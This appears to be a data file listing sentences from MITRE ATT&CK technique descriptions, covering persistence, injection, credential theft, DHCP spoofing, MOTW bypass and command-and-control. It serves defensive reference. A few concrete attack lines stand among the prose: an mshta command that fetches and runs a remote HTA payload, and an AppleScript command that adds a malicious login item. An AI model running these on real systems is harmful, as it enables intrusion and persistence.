    "For example, AWS Traffic Mirroring, GCP Packet Mirroring, and Azure vTap allow users to define specified instances to collect traffic from and specified targets to send collected traffic to.",
    "Often, much of this traffic will be in cleartext due to the use of TLS termination at the load balancer level to reduce the strain of encrypting and decrypting traffic.",

    "Modifications to this DLL could be done to execute arbitrary payloads (while also potentially preserving normal \"termsrv.dll\" functionality) as well as to simply enable abusable features of Terminal Services.",
    "For example, an adversary may enable features such as concurrent [Remote Desktop Protocol](https://attack.mitre.org/techniques/T1021/001) sessions by either patching the \"termsrv.dll\" file or modifying the \"ServiceDll\" value to point to a DLL that provides increased RDP functionality.",
    "On a non-server Windows OS this increased functionality may also enable an adversary to avoid Terminal Services prompts that warn/log out users of a system when a new RDP session is created.",
    "Adversaries may abuse AppleScript for execution.",
    "AppleScript is a macOS scripting language designed to control applications and parts of the OS via inter-application messages called AppleEvents.",

    "These events can locate open windows, send keystrokes, and interact with almost any open application locally or remotely.",
    "Scripts can be run from the command-line via \"osascript /path/to/script\" or \"osascript -e \"script here\"\".",
    "Aside from the command line, scripts can be executed in numerous ways including Mail rules, Calendar.app alarms, and Automator workflows.",
    "AppleScripts can also be executed as plain text shell scripts by adding \"#!/usr/bin/osascript\" to the start of the script file.",
    "AppleScripts do not need to call \"osascript\" to execute.",
    "However, they may be executed from within mach-O binaries by using the macOS [Native API](https://attack.mitre.org/techniques/T1106)s\u00a0\"NSAppleScript\"\u00a0or\u00a0\"OSAScript\", both of which execute code independent of the \"/usr/bin/osascript\" command line utility.",
    "Adversaries may abuse AppleScript to execute various behaviors, such as interacting with an open SSH connection, moving to remote machines, and even presenting users with fake dialog boxes.",
    "These events cannot start applications remotely (they can start them locally), but they can interact with applications if they're already running remotely.",
    "On macOS 10.10 Yosemite and higher, AppleScript has the ability to execute [Native API](https://attack.mitre.org/techniques/T1106)s, which otherwise would require compilation and execution in a mach-O binary file format.",

    "Adversaries may abuse Internet browser extensions to establish persistent access to victim systems.",
    "Browser extensions or plugins are small programs that can add functionality and customize aspects of Internet browsers.",
    "They can be installed directly or through a browser's app store and generally have access and permissions to everything that the browser can access.",
    "Malicious extensions can be installed into a browser through malicious app store downloads masquerading as legitimate extensions, through social engineering, or by an adversary that has already compromised a system.",
    "Security can be limited on browser app stores so it may not be difficult for malicious extensions to defeat automated scanners.",
    "Depending on the browser, adversaries may also manipulate an extension's update url to install updates from an adversary controlled server or manipulate the mobile configuration file to silently install additional extensions.",
    "Previous to macOS 11, adversaries could silently install browser extensions via the command line using the \"profiles\" tool to install malicious \".mobileconfig\" files.",
    "In macOS 11+, the use of the \"profiles\" tool can no longer install configuration profiles, however \".mobileconfig\" files can be planted and installed with user interaction.",
    "Once the extension is installed, it can browse to websites in the background, steal all information that a user enters into a browser (including credentials), and be used as an installer for a RAT for persistence.",

    "Web server software can be attacked through a variety of means, some of which apply generally while others are specific to the software being used to provide the service.",
    "One example of this type of attack is known as a simple HTTP flood, where an adversary sends a large number of HTTP requests to a web server to overwhelm it and/or an application that runs on top of it.",
    "This flood relies on raw volume to accomplish the objective, exhausting any of the various resources required by the victim software to provide the service.",
    "Another variation, known as a SSL renegotiation attack, takes advantage of a protocol feature in SSL/TLS.",
    "The SSL/TLS protocol suite includes mechanisms for the client and server to agree on an encryption algorithm to use for subsequent secure connections.",
    "If SSL renegotiation is enabled, a request can be made for renegotiation of the crypto algorithm.",
    "In a renegotiation attack, the adversary establishes a SSL/TLS connection and then proceeds to make a series of renegotiation requests.",
    "Because the cryptographic renegotiation has a meaningful cost in computation cycles, this can cause an impact to the availability of the service when done in volume.",
    "Adversaries may manipulate hardware components in products prior to receipt by a final consumer for the purpose of data or system compromise.",
    "By modifying hardware or firmware in the supply chain, adversaries can insert a backdoor into consumer networks that may be difficult to detect and give the adversary a high degree of control over the system.",
    "Hardware backdoors may be inserted into various devices, such as servers, workstations, network infrastructure, or peripherals.",
    "Adversaries may interact with the native OS application programming interface (API) to execute behaviors.",
    "Native APIs provide a controlled means of calling low-level OS services within the kernel, such as those involving hardware/devices, memory, and processes.",
    "These native APIs are used by the OS during system boot (when other system components are not yet initialized) as well as carrying out tasks and requests during routine operations.",
    "Native API functions (such as \"NtCreateProcess\") may be directed invoked via system calls / syscalls, but these features are also often exposed to user-mode applications via interfaces and libraries.",
    "For example, functions such as the Windows API \"CreateProcess()\" or GNU \"fork()\" will allow programs and scripts to start other processes.",
    "This may allow API callers to execute a binary, run a CLI command, load modules, etc. as thousands of similar API functions exist for various system operations.",
    "Higher level software frameworks, such as Microsoft .NET and macOS Cocoa, are also available to interact with native APIs.",
    "These frameworks typically provide language wrappers/abstractions to API functionalities and are designed for ease-of-use/portability of code.",
    "Adversaries may abuse these OS API functions as a means of executing behaviors.",
    "Similar to [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059), the native API and its hierarchy of interfaces provide mechanisms to interact with and utilize various components of a victimized system.",
    "While invoking API functions, adversaries may also attempt to bypass defensive tools (ex: unhooking monitored functions via [Disable or Modify Tools](https://attack.mitre.org/techniques/T1562/001)).",

    "For example, RDP connection history may be stored in Windows Registry values under : * \"HKEY_CURRENT_USER\\Software\\Microsoft\\Terminal Server Client\\Default\" * \"HKEY_CURRENT_USER\\Software\\Microsoft\\Terminal Server Client\\Servers\"",
    "Windows may also store information about recent RDP connections in files such as \"C:\\Users\\\\%username%\\Documents\\Default.rdp\" and \"C:\\Users\\%username%\\AppData\\Local\\Microsoft\\Terminal Server Client\\Cache\\\".",
    "Similarly, macOS and Linux hosts may store information highlighting connection history in system logs (such as those stored in \"/Library/Logs\" and/or \"/var/log/\").",
    "Malicious network connections may also require changes to network configuration settings, such as [Disable or Modify System Firewall](https://attack.mitre.org/techniques/T1562/004) or tampering to enable [Proxy](https://attack.mitre.org/techniques/T1090).",

    "If and only if the DC is able to successfully decrypt the timestamp with the hash of the user\u2019s password, it will then send an Authentication Server Response (AS-REP) message that contains the Ticket Granting Ticket (TGT) to the user.",
    "Part of the AS-REP message is signed with the user\u2019s password.",
    "For each account found without preauthentication, an adversary may send an AS-REQ message without the encrypted timestamp and receive an AS-REP message with TGT data which may be encrypted with an insecure algorithm such as RC4.",
    "The recovered encrypted data may be vulnerable to offline [Password Cracking](https://attack.mitre.org/techniques/T1110/002) attacks similarly to [Kerberoasting](https://attack.mitre.org/techniques/T1558/003) and expose plaintext credentials.",
    " An account registered to a domain, with or without special privileges, can be abused to list all domain accounts that have preauthentication disabled by utilizing Windows tools like [PowerShell](https://attack.mitre.org/techniques/T1059/001) with an LDAP filter.",
    "Alternatively, the adversary may send an AS-REQ message for each user.",
    "If the DC responds without errors, the account does not require preauthentication and the AS-REP message will already contain the encrypted data.",
    " Cracked hashes may enable [Persistence](https://attack.mitre.org/tactics/TA0003), [Privilege Escalation](https://attack.mitre.org/tactics/TA0004), and [Lateral Movement](https://attack.mitre.org/tactics/TA0008) via access to [Valid Accounts](https://attack.mitre.org/techniques/T1078).",

    "There exist a variety of cloud service providers that will sell virtual machines/containers as a service.",
    "Adversaries may compromise VPSs purchased by third-party entities.",
    "By compromising a VPS to use as infrastructure, adversaries can make it difficult to physically tie back operations to themselves.",
    "Compromising a VPS for use in later stages of the adversary lifecycle, such as Command and Control, can allow adversaries to benefit from the ubiquity and trust associated with higher reputation cloud service providers as well as that added by the compromised third-party.",
    "Adversaries may reduce the level of effort required to decrypt data transmitted over the network by reducing the cipher strength of encrypted communications.",
    "Adversaries can weaken the encryption software on a compromised network device by reducing the key size used by the software to convert plaintext to ciphertext (e.g., from hundreds or thousands of bytes to just a couple of bytes).",
    "As a result, adversaries dramatically reduce the amount of effort needed to decrypt the protected information without the key.",
    "Adversaries may modify the key size used and other encryption parameters using specialized commands in a [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) introduced to the system through [Modify System Image](https://attack.mitre.org/techniques/T1601) to change the configuration of the device.",
    "In addition to clearing system logs, an adversary may clear the command history of a compromised account to conceal the actions undertaken during an intrusion.",
    "Various command interpreters keep track of the commands users type in their terminal so that users can retrace what they've done.",
    "On Linux and macOS, these command histories can be accessed in a few different ways.",
    "While logged in, this command history is tracked in a file pointed to by the environment variable \"HISTFILE\".",

    "This can result in significantly furthering an adversary's objective in cases where credentials gained from web browsers overlap with privileged accounts (e.g. domain administrator).",
    "Adversaries may execute their own malicious payloads by hijacking the search order used to load other programs.",
    "Because some programs do not call other programs using the full path, adversaries may place their own file in the directory where the calling program is located, causing the operating system to launch their malicious software at the request of the calling program.",
    "Search order hijacking occurs when an adversary abuses the order in which Windows searches for programs that are not given a path.",
    "Unlike [DLL Search Order Hijacking](https://attack.mitre.org/techniques/T1574/001), the search order differs depending on the method that is used to execute the program.",
    "   However, it is common for Windows to search in the directory of the initiating program before searching through the Windows system directory.",
    "An adversary who finds a program vulnerable to search order hijacking (i.e., a program that does not specify the path to an executable) may take advantage of this vulnerability by creating a program named after the improperly specified program and placing it within the initiating program's directory.",
    "For example, \"example.exe\" runs \"cmd.exe\" with the command-line argument \"net user\".",
    "An adversary may place a program called \"net.exe\" within the same directory as example.exe, \"net.exe\" will be run instead of the Windows system utility net.",
    "In addition, if an adversary places a program called \"net.com\" in the same directory as \"net.exe\", then \"cmd.exe /C net user\" will execute \"net.com\" instead of \"net.exe\" due to the order of executable extensions defined under PATHEXT.",
    " Search order hijacking is also a common practice for hijacking DLL loads and is covered in [DLL Search Order Hijacking](https://attack.mitre.org/techniques/T1574/001).",

    "Access is usually obtained through compromising accounts used to manage cloud infrastructure.",
    "Cloud service providers often provide infrastructure throughout the world in order to improve performance, provide redundancy, and allow customers to meet compliance requirements.",
    "Oftentimes, a customer will only use a subset of the available regions and may not actively monitor other regions.",
    "If an adversary creates resources in an unused region, they may be able to operate undetected.",
    "A variation on this behavior takes advantage of differences in functionality across cloud regions.",
    "An adversary could utilize regions which do not support advanced detection services in order to avoid detection of their activity.",
    "An example of adversary use of unused AWS regions is to mine cryptocurrency through [Resource Hijacking](https://attack.mitre.org/techniques/T1496), which can cost organizations substantial amounts of money over time depending on the processing power used.",
    "Adversaries may redirect network traffic to adversary-owned systems by spoofing Dynamic Host Configuration Protocol (DHCP) traffic and acting as a malicious DHCP server on the victim network.",
    "By achieving the adversary-in-the-middle (AiTM) position, adversaries may collect network communications, including passed credentials, especially those sent over insecure, unencrypted protocols.",

    "DHCP is based on a client-server model and has two functionalities: a protocol for providing network configuration settings from a DHCP server to a client and a mechanism for allocating network addresses to clients.",
    "The typical server-client interaction is as follows: 1. The client broadcasts a \"DISCOVER\" message.",
    "2. The server responds with an \"OFFER\" message, which includes an available network address.",
    "3. The client broadcasts a \"REQUEST\" message, which includes the network address offered.",
    "4. The server acknowledges with an \"ACK\" message and the client receives the network configuration parameters.",
    "Adversaries may spoof as a rogue DHCP server on the victim network, from which legitimate hosts may receive malicious network configurations.",
    "For example, malware can act as a DHCP server and provide adversary-owned DNS servers to the victimized computers.",
    "Through the malicious network configurations, an adversary may achieve the AiTM position, route client traffic through adversary-controlled systems, and collect information from the client network.",
    "DHCPv6 clients can receive network configuration information without being assigned an IP address by sending a \"INFORMATION-REQUEST (code 11)\" message to the \"All_DHCP_Relay_Agents_and_Servers\" multicast address.",
    "Adversaries may use their rogue DHCP server to respond to this request message with malicious network configurations.",
    "Rather than establishing an AiTM position, adversaries may also abuse DHCP spoofing to perform a DHCP exhaustion attack (i.e, [Service Exhaustion Flood](https://attack.mitre.org/techniques/T1499/002)) by generating many broadcast DISCOVER messages to exhaust a network\u2019s DHCP allocation pool.",
    "Adversaries may take control of preexisting sessions with remote services to move laterally in an environment.",
    "Users may use valid credentials to log into a service specifically designed to accept remote connections, such as telnet, SSH, and RDP.",

    "[Remote Service Session Hijacking](https://attack.mitre.org/techniques/T1563) differs from use of [Remote Services](https://attack.mitre.org/techniques/T1021) because it hijacks an existing session rather than creating a new session using [Valid Accounts](https://attack.mitre.org/techniques/T1078).",
    "Adversaries may use binary padding to add junk data and change the on-disk representation of malware.",
    "This can be done without affecting the functionality or behavior of a binary, but can increase the size of the binary beyond what some security tools are capable of handling due to file size limitations.",
    "Binary padding effectively changes the checksum of the file and can also be used to avoid hash-based blocklists and static anti-virus signatures.",
    "The padding used is commonly generated by a function to create junk data and then appended to the end or applied to sections of malware.",
    "Increasing the file size may decrease the effectiveness of certain tools and detection capabilities that are not designed or configured to scan large files.",
    "This may also reduce the likelihood of being collected for analysis.",

    "A Web shell is a Web script that is placed on an openly accessible Web server to allow an adversary to use the Web server as a gateway into a network.",
    "A Web shell may provide a set of functions to execute or a command-line interface on the system that hosts the Web server.",
    "In addition to a server-side script, a Web shell may have a client interface program that is used to talk to the Web server (e.g. [China Chopper](https://attack.mitre.org/software/S0020) Web shell client).",
    "Adversaries may modify Group Policy Objects (GPOs) to subvert the intended discretionary access controls for a domain, usually with the intention of escalating privileges on the domain.",
    "Group policy allows for centralized management of user and computer settings in Active Directory (AD).",
    "GPOs are containers for group policy settings made up of files stored within a predictable network path \"\\<DOMAIN>\\SYSVOL\\<DOMAIN>\\Policies\\\".",
    "Like other objects in AD, GPOs have access controls associated with them.",
    "By default all user accounts in the domain have permission to read GPOs.",
    "It is possible to delegate GPO access control permissions, e.g. write access, to specific users or groups in the domain.",

    "For example, \"overpassing the hash\" involves using a NTLM password hash to authenticate as a user (i.e. [Pass the Hash](https://attack.mitre.org/techniques/T1550/002)) while also using the password hash to create a valid Kerberos ticket.",
    "Adversaries may abuse a container administration service to execute commands within a container.",
    "A container administration service such as the Docker daemon, the Kubernetes API server, or the kubelet may allow remote management of containers within an environment.",
    "In Docker, adversaries may specify an entrypoint during container deployment that executes a script or command, or they may use a command such as \"docker exec\" to execute a command within a running container.",
    "In Kubernetes, if an adversary has sufficient permissions, they may gain remote execution in a container in the cluster via interaction with the Kubernetes API server, the kubelet, or by running a command such as \"kubectl exec\".",
    "Adversaries may enumerate files and directories or may search in specific locations of a host or network share for certain information within a file system.",
    "Adversaries may use the information from [File and Directory Discovery](https://attack.mitre.org/techniques/T1083) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.",
    "Many command shell utilities can be used to obtain this information.",
    "Examples include \"dir\", \"tree\", \"ls\", \"find\", and \"locate\".",
    "Custom tools may also be used to gather file and directory information and interact with the [Native API](https://attack.mitre.org/techniques/T1106).",
    "Adversaries may also use a [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) on network devices to gather file and directory information (e.g. \"dir\", \"show flash\", and/or \"nvram\").",
    "Adversaries may dynamically establish connections to command and control infrastructure to evade common detections and remediations.",
    "This may be achieved by using malware that shares a common algorithm with the infrastructure the adversary uses to receive the malware's communications.",
    "These calculations can be used to dynamically adjust parameters such as the domain name, IP address, or port number the malware uses for command and control.",
    "Adversaries may use dynamic resolution for the purpose of [Fallback Channels](https://attack.mitre.org/techniques/T1008).",
    "When contact is lost with the primary command and control server malware may employ dynamic resolution as a means to reestablishing command and control.",
    "Adversaries may attempt to manipulate the name of a task or service to make it appear legitimate or benign.",
    "Tasks/services executed by the Task Scheduler or systemd will typically be given a name and/or description.",

    "Adversaries may inject malicious code into processes via the asynchronous procedure call (APC) queue in order to evade process-based defenses as well as possibly elevate privileges.",
    "APC injection is a method of executing arbitrary code in the address space of a separate live process.",
    "APC injection is commonly performed by attaching malicious code to the APC Queue  of a process's thread.",
    "Queued APC functions are executed when the thread enters an alterable state.",
    "A handle to an existing victim process is first created with native Windows API calls such as \"OpenThread\".",
    "At this point \"QueueUserAPC\" can be used to invoke a function (such as \"LoadLibrayA\" pointing to a malicious DLL).",
    "A variation of APC injection, dubbed \"Early Bird injection\", involves creating a suspended process in which malicious code can be written and executed before the process' entry point (and potentially subsequent anti-malware hooks) via an APC.",
    " AtomBombing  is another variation that utilizes APCs to invoke malicious code previously written to the global atom table.",
    "Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges.",
    "Execution via APC injection may also evade detection from security products since the execution is masked under a legitimate process.",
    "Adversaries may use traffic mirroring in order to automate data exfiltration over compromised infrastructure.",
    "Traffic mirroring is a native feature for some devices, often used for network analysis.",

    "Adversaries may modify property list files (plist files) to enable other malicious activity, while also potentially evading and bypassing system defenses.",
    "macOS applications use plist files, such as the \"info.plist\" file, to store properties and configuration settings that inform the operating system how to handle the application at runtime.",
    "Plist files are structured metadata in key-value pairs formatted in XML based on Apple's Core Foundation DTD.",
    "Plist files can be saved in text or binary format.",
    "Adversaries can modify key-value pairs in plist files to influence system behaviors, such as hiding the execution of an application (i.e. [Hidden Window](https://attack.mitre.org/techniques/T1564/003)) or running additional commands for persistence (ex: [Launch Agent](https://attack.mitre.org/techniques/T1543/001)/[Launch Daemon](https://attack.mitre.org/techniques/T1543/004) or [Re-opened Applications](https://attack.mitre.org/techniques/T1547/007)).",

    "Administrators may also create forwarding rules for user accounts with the same considerations and outcomes.",
    "Any user or administrator within the organization (or adversary with valid credentials) can create rules to automatically forward all received messages to another recipient, forward emails to different locations based on the sender, and more.",
    "Adversaries may also hide the rule by making use of the Microsoft Messaging API (MAPI) to modify the rule properties, making it hidden and not visible from Outlook, OWA or most Exchange Administration tools.",
    "In some environments, administrators may be able to enable email forwarding rules that operate organization-wide rather than on individual inboxes.",
    "For example, Microsoft Exchange supports transport rules that evaluate all mail an organization receives against user-specified conditions, then performs a user-specified action on mail that adheres to those conditions.",
    "Adversaries that abuse such features may be able to enable forwarding on all or specific mail an organization receives.",
    "Adversaries may stage collected data in a central location or directory prior to Exfiltration.",

    "With appropriate enrollment rights, users and/or machines within a domain can also request and/or manually renew certificates from enterprise certificate authorities (CA).",
    "This enrollment process defines various settings and permissions associated with the certificate.",
    "Of note, the certificate\u2019s extended key usage (EKU) values define signing, encryption, and authentication use cases, while the certificate\u2019s subject alternative name (SAN) values define the certificate owner\u2019s alternate names.",
    "Abusing certificates for authentication credentials may enable other behaviors such as [Lateral Movement](https://attack.mitre.org/tactics/TA0008).",
    "Certificate-related misconfigurations may also enable opportunities for [Privilege Escalation](https://attack.mitre.org/tactics/TA0004), by way of allowing users to impersonate or assume privileged accounts or permissions via the identities (SANs) associated with a certificate.",

    "Adversaries may also target certificates and related services in order to access other forms of credentials, such as [Golden Ticket](https://attack.mitre.org/techniques/T1558/001) ticket-granting tickets (TGT) or NTLM plaintext.",
    "Adversaries may register a device to an adversary-controlled account.",
    "Devices may be registered in a multifactor authentication (MFA) system, which handles authentication to the network, or in a device management system, which handles device access and compliance.",
    "MFA systems, such as Duo or Okta, allow users to associate devices with their accounts in order to complete MFA requirements.",
    "An adversary that compromises a user\u2019s credentials may enroll a new device in order to bypass initial MFA requirements and gain persistent access to a network.",
    "In some cases, the MFA self-enrollment process may require only a username and password to enroll the account's first device or to enroll a device to an inactive account.",
    " Similarly, an adversary with existing access to a network may register a device to Azure AD and/or its device management system, Microsoft Intune, in order to access sensitive data or resources while bypassing conditional access policies.",

    "Adversaries may attempt to get a listing of network connections to or from the compromised system they are currently accessing or from remote systems by querying for information over the network.",
    "An adversary who gains access to a system that is part of a cloud-based environment may map out Virtual Private Clouds or Virtual Networks in order to determine what systems and services are connected.",
    "The actions performed are likely the same types of discovery techniques depending on the operating system, but the resulting information may include details about the networked cloud environment relevant to the adversary's goals.",
    "Cloud providers may have different ways in which their virtual networks operate.",
    "Similarly, adversaries who gain access to network devices may also perform similar discovery activities to gather information about connected systems and services.",

    "Prior to targeting, adversaries may compromise the infrastructure of other adversaries.",
    "Adversaries may abuse specific file formats to subvert Mark-of-the-Web (MOTW) controls.",
    "In Windows, when files are downloaded from the Internet, they are tagged with a hidden NTFS Alternate Data Stream (ADS) named \"Zone.Identifier\" with a specific value known as the MOTW.",
    "Files that are tagged with MOTW are protected and cannot perform certain actions.",
    "For example, starting in MS Office 10, if a MS Office file has the MOTW, it will open in Protected View.",
    "Executables tagged with the MOTW will be processed by Windows Defender SmartScreen that compares files with an allowlist of well-known executables.",
    "If the file is not known/trusted, SmartScreen will prevent the execution and warn the user not to run it.",

    "Container files downloaded from the Internet will be marked with MOTW but the files within may not inherit the MOTW after the container files are extracted and/or mounted.",
    "MOTW is a NTFS feature and many container files do not support NTFS alternative data streams.",
    "After a container file is extracted and/or mounted, the files contained within them may be treated as local files on disk and run without protections.",
    "Adversaries disable a network device\u2019s dedicated hardware encryption, which may enable them to use weaknesses in software encryption in order to reduce the effort involved in collecting, manipulating, and exfiltrating transmitted data.",
    "Many network devices such as routers, switches, and firewalls, perform encryption on network traffic to secure transmission across networks.",
    "Often, these devices are equipped with special, dedicated encryption hardware to greatly increase the speed of the encryption process as well as to prevent malicious tampering.",
    "When an adversary takes control of such a device, they may disable the dedicated hardware, for example, through use of [Modify System Image](https://attack.mitre.org/techniques/T1601), forcing the use of software to perform encryption on general processors.",
    "This is typically used in conjunction with attacks to weaken the strength of the cipher in software (e.g., [Reduce Key Space](https://attack.mitre.org/techniques/T1600/001)).",
    "Adversaries may abuse Pre-OS Boot mechanisms as a way to establish persistence on a system.",
    "During the booting process of a computer, firmware and various startup services are loaded before the operating system.",

    "Adversaries may overwrite data in boot drivers or firmware such as BIOS (Basic Input/Output System) and The Unified Extensible Firmware Interface (UEFI) to persist on systems at a layer below the operating system.",
    "This can be particularly difficult to detect as malware at this level will not be detected by host software-based defenses.",
    "Adversaries may build a container image directly on a host to bypass defenses that monitor for the retrieval of malicious images from a public registry.",
    "A remote \"build\" request may be sent to the Docker API that includes a Dockerfile that pulls a vanilla base image, such as alpine, from a public or local registry and then builds a custom image upon it.",
    "An adversary may take advantage of that \"build\" API to build a custom image on the host that includes malware downloaded from their C2 server, and then they may utilize [Deploy Container](https://attack.mitre.org/techniques/T1610) using that custom image.",
    "If the base image is pulled from a public registry, defenses will likely not detect the image as malicious since it\u2019s a vanilla image.",
    "If the base image already resides in a local registry, the pull may be considered even less suspicious since the image is already in the environment.",
    "Adversaries may inject portable executables (PE) into processes in order to evade process-based defenses as well as possibly elevate privileges.",
    "PE injection is a method of executing arbitrary code in the address space of a separate live process.",
    "PE injection is commonly performed by copying code (perhaps without a file on disk) into the virtual address space of the target process before invoking it via a new thread.",
    "The write can be performed with native Windows API calls such as \"VirtualAllocEx\" and \"WriteProcessMemory\", then invoked with \"CreateRemoteThread\" or additional code (ex: shellcode).",
    "The displacement of the injected code does introduce the additional requirement for functionality to remap memory references.",
    " Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges.",

    "Adversaries may compromise numerous third-party systems to form a botnet\u00a0that can be used during targeting.",
    "A botnet is a network of compromised systems that can be instructed to perform coordinated tasks.",
    "Instead of purchasing/renting a botnet from a booter/stresser service, adversaries may build their own botnet by compromising numerous third-party systems.",

    "It is possible to extract passwords from backups or saved virtual machines through [OS Credential Dumping](https://attack.mitre.org/techniques/T1003).  Passwords may also be obtained from Group Policy Preferences stored on the Windows Domain Controller.  In cloud and/or containerized environments, authenticated user and service account credentials are often stored in local configuration and credential files.",
    "They may also be found as parameters to deployment commands in container logs.",
    "In some cases, these files can be copied and reused on another machine or the contents can be read and then used to authenticate without needing to copy any files.",
    "Adversaries may perform calculations on addresses returned in DNS results to determine which port and IP address to use for command and control, rather than relying on a predetermined port number or the actual returned IP address.",
    "A IP and/or port number calculation can be used to bypass egress filtering on a C2 channel.",
    "One implementation of [DNS Calculation](https://attack.mitre.org/techniques/T1568/003) is to take the first three octets of an IP address in a DNS response and use those values to calculate the port for command and control traffic.",
    "Adversaries may abuse mshta.exe to proxy execution of malicious .hta files and Javascript or VBScript through a trusted Windows utility.",
    "There are several examples of different types of threats using mshta.exe during initial compromise and for execution of code      Mshta.exe is a utility that executes Microsoft HTML Applications (HTA) files.",
    " HTAs are standalone applications that execute using the same models and technologies of Internet Explorer, but outside of the browser.",

    "They may also be executed directly from URLs: \"mshta http[:]//webserver/payload[.]hta\"",
    "Mshta.exe can be used to bypass application control solutions that do not account for its potential use.",
    "Since mshta.exe executes outside of the Internet Explorer's security context, it also bypasses browser security settings.",
    "Adversaries may add login items to execute upon user login to gain persistence or escalate privileges.",
    "Login items are applications, documents, folders, or server connections that are automatically launched when a user logs in.",
    "Login items can be added via a shared file list or Service Management Framework.",
    "Shared file list login items can be set using scripting languages such as [AppleScript](https://attack.mitre.org/techniques/T1059/002), whereas the Service Management Framework uses the API call \"SMLoginItemSetEnabled\".",
    "Login items installed using the Service Management Framework use \"launchd\", are not visible in the System Preferences, and can only be removed by the application that created them.",
    "Login items created using a shared file list are visible in System Preferences, can hide the application when it launches, and are executed through LaunchServices, not launchd, to open applications, documents, or URLs without using Finder.",
    "Users and applications use login items to configure their user environment to launch commonly used services or applications, such as email, chat, and music applications.",
    "Adversaries can utilize [AppleScript](https://attack.mitre.org/techniques/T1059/002) and [Native API](https://attack.mitre.org/techniques/T1106) calls to create a login item to spawn malicious executables.",
    "Prior to version 10.5 on macOS, adversaries can add login items by using [AppleScript](https://attack.mitre.org/techniques/T1059/002) to send an Apple events to the \u201cSystem Events\u201d process, which has an AppleScript dictionary for manipulating login items.",
    "Adversaries can use a command such as \"tell application \u201cSystem Events\u201d to make login item at end with properties /path/to/executable\".",
    "This command adds the path of the malicious executable to the login item file list located in \"~/Library/Application Support/com.apple.backgroundtaskmanagementagent/backgrounditems.btm\".",
    "Adversaries can also use login items to launch executables that can be used to control the victim system remotely or as a means to gain privilege escalation by prompting for user credentials.",
    "Adversaries may upload, install, or otherwise set up capabilities that can be used during targeting.",
    "To support their operations, an adversary may need to take capabilities they developed ([Develop Capabilities](https://attack.mitre.org/techniques/T1587)) or obtained ([Obtain Capabilities](https://attack.mitre.org/techniques/T1588)) and stage them on infrastructure under their control.",

    "Link shortening services can also be employed.",
    "Adversaries may also use free or paid accounts on Platform-as-a-Service providers to host link targets while taking advantage of the widely trusted domains of those providers to avoid being blocked.",
    "Finally, adversaries may take advantage of the decentralized nature of the InterPlanetary File System (IPFS) to host link targets that are difficult to remove.",
    "Adversaries may create multiple stages for command and control that are employed under different conditions or for certain functions.",
    "Use of multiple stages may obfuscate the command and control channel to make detection more difficult.",
    "Remote access tools will call back to the first-stage command and control server for instructions.",
    "The first stage may have automated capabilities to collect basic host information, update tools, and upload additional files.",
    "A second remote access tool (RAT) could be uploaded at that point to redirect the host to the second-stage command and control server.",
    "The second stage will likely be more fully featured and allow the adversary to interact with the system through a reverse shell and additional RAT features.",
    "The different stages will likely be hosted separately with no overlapping infrastructure.",
    "The loader may also have backup first-stage callbacks or [Fallback Channels](https://attack.mitre.org/techniques/T1008) in case the original first-stage communication path is discovered and blocked.",
    "Adversaries may use execution guardrails to constrain execution or actions based on adversary supplied and environment specific conditions that are expected to be present on the target.",
    "Guardrails ensure that a payload only executes against an intended target and reduces collateral damage from an adversary\u2019s campaign.",
    "Values an adversary can provide about a target system or environment to use as guardrails may include specific network share names, attached physical devices, files, joined Active Directory (AD) domains, and local/external IP addresses.",
    "Guardrails can be used to prevent exposure of capabilities in environments that are not intended to be compromised or operated within.",
    "This use of guardrails is distinct from typical [Virtualization/Sandbox Evasion](https://attack.mitre.org/techniques/T1497).",
    "While use of [Virtualization/Sandbox Evasion](https://attack.mitre.org/techniques/T1497) may involve checking for known sandbox values and continuing with execution only if there is no match, the use of guardrails will involve checking for an expected target-specific value and only continuing with execution if there is such a match.",

    "Adversaries may forge web cookies that can be used to gain access to web applications or Internet services.",
    "Web applications and services (hosted in cloud SaaS environments or on-premise servers) often use session cookies to authenticate and authorize user access.",
    "Adversaries may generate these cookies in order to gain access to web resources.",
    "This differs from [Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539) and other similar behaviors in that the cookies are new and forged by the adversary, rather than stolen or intercepted from legitimate users.",
    "Most common web applications have standardized and documented cookie values that can be generated using provided tools or interfaces.",
    "The generation of web cookies often requires secret values, such as passwords, [Private Keys](https://attack.mitre.org/techniques/T1552/004), or other cryptographic seed values.",
    "Once forged, adversaries may use these web cookies to access resources ([Web Session Cookie](https://attack.mitre.org/techniques/T1550/004)), which may bypass multi-factor and other authentication protection mechanisms.",
    "Adversaries may duplicate then impersonate another user's existing token to escalate privileges and bypass access controls.",
    "For example, an adversary can duplicate an existing token using \"DuplicateToken\" or \"DuplicateTokenEx\".",
    "The token can then be used with \"ImpersonateLoggedOnUser\" to allow the calling thread to impersonate a logged on user's security context, or with \"SetThreadToken\" to assign the impersonated token to a thread.",
    "An adversary may perform [Token Impersonation/Theft](https://attack.mitre.org/techniques/T1134/001) when they have a specific, existing process they want to assign the duplicated token to.",
    "For example, this may be useful for when the target user has a non-network logon session on the system.",
    "When an adversary would instead use a duplicated token to create a new process rather than attaching to an existing process, they can additionally [Create Process with Token](https://attack.mitre.org/techniques/T1134/002) using \"CreateProcessWithTokenW\" or \"CreateProcessAsUserW\".",
    "[Token Impersonation/Theft](https://attack.mitre.org/techniques/T1134/001) is also distinct from [Make and Impersonate Token](https://attack.mitre.org/techniques/T1134/003) in that it refers to duplicating an existing token, rather than creating a new one.",
    "Adversaries may exfiltrate data to a code repository rather than over their primary command and control channel.",
    "Code repositories are often accessible via an API (ex: https://api.github.com).",
    "Access to these APIs are often over HTTPS, which gives the adversary an additional level of protection.",
    "Exfiltration to a code repository can also provide a significant amount of cover to the adversary if it is a popular service already used by hosts within the network.",
    "Adversaries may log into accessible cloud services within a compromised environment using [Valid Accounts](https://attack.mitre.org/techniques/T1078) that are synchronized with or federated to on-premises user identities.",
    "The adversary may then perform management actions or access cloud-hosted resources as the logged-on user.",
    "Many enterprises federate centrally managed user identities to cloud services, allowing users to login with their domain credentials in order to access the cloud control plane.",
